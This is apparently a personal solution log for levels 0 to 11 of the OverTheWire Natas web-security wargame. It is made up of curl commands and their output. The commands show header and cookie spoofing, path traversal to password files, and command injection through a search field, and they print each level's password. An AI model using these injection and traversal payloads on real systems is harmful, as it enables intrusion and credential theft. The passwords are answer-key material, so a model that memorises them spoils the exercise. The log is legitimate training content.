# Natas challenges

http://natas0.natas.labs.overthewire.org/

## level 0
~» curl -s http://natas0.natas.labs.overthewire.org -u natas0:natas0  | ag pass
<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script></head>
You can find the password for the next level on this page.
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->

## level 1
~» curl -s -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org  | ag "the pass"
You can find the password for the
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->

## level 2
~» curl -s -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH

## level 3
~» curl -s -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

## level 4
~» curl -s -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ http://natas4.natas.labs.overthewire.org/ --referer  "http://natas5.natas.labs.overthewire.org/" | ag "the password"
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

## level 5
~» curl -s -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org/ --cookie 'loggedin=1' | ag "the password"
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

## level 6
~» curl -s -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/includes/secret.inc
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>

## level 7
~» curl -X POST --data "secret=FOEIUWGHFEEUHOFUOIU&submit=submit" -s -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/ | ag "the password"
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

## level 7
~» curl -s -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' | elinks -dump
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

## level 8
~» curl -s -u natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 'http://natas8.natas.labs.overthewire.org/'  -X POST --data "secret=oubWYf2kBq&submit=submit" | ag granted
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

## level 9
~» curl -s -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 'http://natas9.natas.labs.overthewire.org/'  --data 'submit=submit&needle=u /etc/natas_webpass/natas10;' | ag
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

## level 10
~» curl -s -u natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu 'http://natas10.natas.labs.overthewire.org/' --data "submit=submit&needle=c /etc/natas_webpass/natas11 #"
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

## level 11
~» curl -s -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK 'http://natas11.natas.labs.overthewire.org/index-source.html' | elinks -dump



